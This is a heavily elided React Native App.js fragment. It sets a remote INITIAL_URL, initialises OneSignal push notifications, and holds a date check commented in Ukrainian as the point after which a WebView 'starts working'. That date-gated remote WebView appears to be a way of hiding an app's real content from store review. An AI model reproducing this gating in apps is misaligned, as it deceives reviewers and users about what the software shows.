...
////////////////////////////////////////////////
import BigWaveSplashProductScreen from './src/screens/BigWaveSplashProductScreen';
...
const App = () => {
      ...
      const INITIAL_URL = `https://outstanding-eminent-delight.space/`;
      const URL_IDENTIFAIRE = `1sYxgKQn`;
      ...
      OneSignal.initialize('1eaaf93d-e2a5-43af-831a-46d04cfab777');
      ...
      useEffect(() => {
            ...
            const targetData = new Date('2025-02-23T10:00:00'); //дата з якої поч працювати webView
                  ...
                  return (
                        <Stack.Navigator>
                              <Stack.Screen
                                    ...
                                    name="BigWaveSplashProductScreen"
                                    component={BigWaveSplashProductScreen}
            ...
            <NavigationContainer>
                  ...
                  {!louderIsEnded || !aceptTransperency || !completeLink ? (
                        <View
                              ...
                              <Animated.Image
                                    source={require('./src/assets/loaders/1.jpg')}
                                    style={{
                                          //...props.style,
                              ...
                              />
                              <Animated.Image
                                    source={require('./src/assets/loaders/2.jpg')}
                                    style={{
                                          //...props.style,
